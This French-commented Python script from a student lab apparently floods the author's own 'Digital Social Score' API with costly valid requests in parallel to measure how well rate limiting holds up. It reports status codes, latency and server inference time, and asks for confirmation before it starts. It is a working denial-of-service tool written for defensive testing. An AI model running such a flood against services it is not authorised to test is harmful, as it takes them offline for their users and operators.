"""Attaque par coût asymétrique contre NOTRE API Digital Social Score (TP2, étapes 2-3).

Envoie des requêtes VALIDES mais coûteuses à traiter (voir attack/payloads.py) vers /score, en
parallèle, et mesure l'effet sur la disponibilité : débit, codes de réponse, latence, temps
d'inférence serveur. Une vue se rafraîchit chaque seconde pour voir le profil de l'attaque en direct.

    python attack/flood.py --ip 34.54.213.190 --key MA_CLE --workers 200 --duration 120 --insecure
    python attack/flood.py --host https://34-54-213-190.sslip.io --key MA_CLE --workers 200 --duration 120

Cible : uniquement VOTRE propre déploiement, que vous êtes autorisé à tester. Le script affiche la
cible et demande une confirmation avant de commencer (--yes pour la passer).

La clé peut venir de --key, sinon de la variable d'environnement ATTACK_API_KEY. La passer en
argument la laisse dans l'historique du shell et dans « ps » : préférez la variable d'environnement.
La clé n'est jamais écrite dans le rapport JSON.
"""

from __future__ import annotations

import argparse
import json
import os
import statistics
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from pathlib import Path

import requests
import urllib3

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))  # permet « python attack/flood.py » autant que « python -m attack.flood »
from attack.payloads import build  # noqa: E402

OUT_DIR = ROOT / "reports" / "attack"


def code_bucket(status: int | str) -> str:
    """Regroupe le code de réponse en famille lisible."""
    if isinstance(status, str):
        return "timeout" if "Timeout" in status else "erreur_reseau"
    if status == 200:
        return "200"
    if status == 429:
        return "429"
    if 500 <= status < 600:
        return "5xx"
    return f"{status // 100}xx"


class Stats:
    """Compteurs partagés par les threads : codes, latences, temps d'inférence serveur."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.codes: Counter[str] = Counter()
        self.client_ms: list[float] = []      # latence vue par le client (toutes requêtes)
        self.server_ms: list[float] = []      # latency_ms renvoyé par l'API (réponses 200)
        self.sent = 0
        self.timeline: list[dict] = []        # une entrée toutes les ~1 s (séries temporelles)

    def record(self, bucket: str, client_ms: float, server_ms: float | None) -> None:
        with self.lock:
            self.sent += 1
            self.codes[bucket] += 1
            self.client_ms.append(client_ms)
            if server_ms is not None:
                self.server_ms.append(server_ms)

    def snapshot(self) -> tuple[int, dict, float, float, float, float]:
        with self.lock:
            p = _pcts(self.client_ms)
            srv = statistics.mean(self.server_ms) if self.server_ms else 0.0
            return self.sent, dict(self.codes), p[0], p[1], p[2], srv


def _pcts(xs: list[float]) -> tuple[float, float, float]:
    if not xs:
        return 0.0, 0.0, 0.0
    s = sorted(xs)
    q = lambda f: s[min(len(s) - 1, int(f * len(s)))]
    return q(0.50), q(0.95), q(0.99)


def worker(stop: float, host: str, key: str, profile: str, timeout: float, verify, stats: Stats, wid: int) -> None:
    """Envoie des requêtes en boucle jusqu'à l'échéance, une charge pire-cas à chaque fois."""
    s = requests.Session()
    s.verify = verify
    headers = {"X-API-Key": key, "Content-Type": "application/json"}
    n = 0
    while time.monotonic() < stop:
        payload = build(profile, seed=wid * 100003 + n)  # charge différente à chaque requête
        n += 1
        t0 = time.monotonic()
        try:
            r = s.post(host + "/score", data=json.dumps({"text": payload}), headers=headers, timeout=timeout)
            client_ms = (time.monotonic() - t0) * 1000
            server_ms = None
            if r.status_code == 200:
                try:
                    server_ms = float(r.json().get("latency_ms"))
                except (ValueError, TypeError, requests.JSONDecodeError):
                    server_ms = None
            stats.record(code_bucket(r.status_code), client_ms, server_ms)
        except requests.RequestException as e:
            client_ms = (time.monotonic() - t0) * 1000
            stats.record(code_bucket(type(e).__name__), client_ms, None)


def live_view(stop_flag: dict, stats: Stats, start: float, duration: int, host: str, profile: str, workers: int) -> None:
    """Rafraîchit un tableau chaque seconde ; enregistre une ligne de série temporelle à chaque tick."""
    last_sent, last_t = 0, start
    header = f"Attaque cout asymetrique -> {host}   profil={profile}  workers={workers}  duree={duration}s"
    cols = f"{'temps':>6}  {'envoyees':>9}  {'req/s':>6}  {'200':>6}  {'429':>6}  {'5xx':>5}  {'timeout':>7}  {'P50':>7}  {'P95':>7}  {'P99':>7}  {'infer.srv':>9}"
    while not stop_flag.get("done"):
        time.sleep(1.0)
        now = time.monotonic()
        sent, codes, p50, p95, p99, srv = stats.snapshot()
        rps = (sent - last_sent) / max(1e-9, now - last_t)
        last_sent, last_t = sent, now
        elapsed = now - start
        row = {"t": round(elapsed, 1), "envoyees": sent, "req_s": round(rps, 1), "codes": codes,
               "p50_ms": round(p50, 1), "p95_ms": round(p95, 1), "p99_ms": round(p99, 1), "inference_ms": round(srv, 1)}
        with stats.lock:
            stats.timeline.append(row)
        if not stop_flag.get("quiet"):
            sys.stdout.write("\x1b[2J\x1b[H")  # efface l'écran, curseur en haut
            m, s = divmod(int(elapsed), 60)
            print(header)
            print(cols)
            print(f"{m:>3}:{s:02d}  {sent:>9}  {rps:>6.1f}  {codes.get('200', 0):>6}  {codes.get('429', 0):>6}  "
                  f"{codes.get('5xx', 0):>5}  {codes.get('timeout', 0):>7}  {p50:>6.0f}m  {p95:>6.0f}m  {p99:>6.0f}m  {srv:>7.0f}m")
            print("\n(Ctrl+C pour arreter ; ouvrez Grafana a cote pour voir CPU, pods et 429)")


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--host", help="https://<nom ou IP> de VOTRE API, ex. https://34-54-213-190.sslip.io")
    g.add_argument("--ip", help="IP de VOTRE API (equivaut a --host https://<ip>)")
    ap.add_argument("--key", help="cle API (sinon $ATTACK_API_KEY) ; en clair, elle reste dans l'historique du shell")
    ap.add_argument("--workers", type=int, default=200, help="requetes en parallele (defaut 200)")
    ap.add_argument("--duration", type=int, default=120, help="duree en secondes (defaut 120)")
    ap.add_argument("--profile", default="mixed", choices=["names", "emoji", "mixed"], help="type de charge pire-cas")
    ap.add_argument("--timeout", type=float, default=30, help="delai max par requete en secondes (defaut 30)")
    ap.add_argument("--insecure", action="store_true", help="accepte le certificat auto-signe (cible en https://<ip>)")
    ap.add_argument("--quiet", action="store_true", help="pas de tableau en direct")
    ap.add_argument("--label", default="", help="etiquette ecrite dans le rapport (ex. sans-defense)")
    ap.add_argument("--yes", action="store_true", help="ne pas demander de confirmation")
    args = ap.parse_args()

    if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
        try:
            sys.stdout.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass

    host = (args.host or f"https://{args.ip}").rstrip("/")
    key = args.key or os.environ.get("ATTACK_API_KEY")
    if not key:
        ap.error("cle API manquante : --key <cle> ou variable d'environnement ATTACK_API_KEY")
    if args.key:
        print("Avertissement : --key en clair reste dans l'historique du shell et dans « ps » "
              "(preferez ATTACK_API_KEY).", file=sys.stderr)

    verify = False if args.insecure else True
    if not verify:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print(f"Cible : {host}")
    print(f"Charge : profil {args.profile}, {args.workers} requetes en parallele, {args.duration} s.")
    print("N'attaquez que votre propre API, que vous etes autorise a tester.")
    if not args.yes:
        try:
            if input("Taper « go » pour lancer : ").strip() != "go":
                raise SystemExit("annule")
        except EOFError:
            raise SystemExit("pas de confirmation possible (entree non interactive) : relancer avec --yes")

    stats = Stats()
    start = time.monotonic()
    stop = start + args.duration
    stop_flag = {"done": False, "quiet": args.quiet}
    viewer = threading.Thread(target=live_view, args=(stop_flag, stats, start, args.duration, host, args.profile, args.workers), daemon=True)
    viewer.start()

    try:
        with ThreadPoolExecutor(args.workers) as ex:
            for wid in range(args.workers):
                ex.submit(worker, stop, host, key, args.profile, args.timeout, verify, stats, wid)
    except KeyboardInterrupt:
        print("\nArret demande.", file=sys.stderr)
    finally:
        stop_flag["done"] = True
        viewer.join(timeout=2)

    sent, codes, p50, p95, p99, srv = stats.snapshot()
    elapsed = time.monotonic() - start
    report = {
        "cible": host, "profil": args.profile, "workers": args.workers,
        "duree_s": round(elapsed, 1), "label": args.label, "debut": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "total_envoyees": sent, "debit_moyen_req_s": round(sent / max(1e-9, elapsed), 1),
        "codes": codes,
        "latence_client_ms": {"p50": round(p50, 1), "p95": round(p95, 1), "p99": round(p99, 1)},
        "inference_serveur_ms_moyenne": round(srv, 1),
        "timeline": stats.timeline,  # aucune cle ni aucun texte : seulement des mesures
    }
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    suffix = f"_{args.label}" if args.label else ""
    out = OUT_DIR / f"flood{suffix}_{datetime.now():%Y%m%d_%H%M%S}.json"
    out.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")

    print("\n=== Resume ===")
    print(f"  envoyees        : {sent}  ({report['debit_moyen_req_s']} req/s en moyenne)")
    print(f"  codes           : {codes}")
    print(f"  latence client  : P50 {p50:.0f} ms  P95 {p95:.0f} ms  P99 {p99:.0f} ms")
    print(f"  inference serveur: {srv:.0f} ms en moyenne (reponses 200)")
    print(f"  rapport         : {out.relative_to(ROOT)}")
    if codes.get("5xx") or codes.get("timeout"):
        print("  -> des 5xx/timeouts : l'API a ete saturee (defense insuffisante ou absente).")
    elif codes.get("429"):
        print("  -> surtout des 429 : la limite de requetes tient. Comparez avec/sans defense.")


if __name__ == "__main__":
    main()
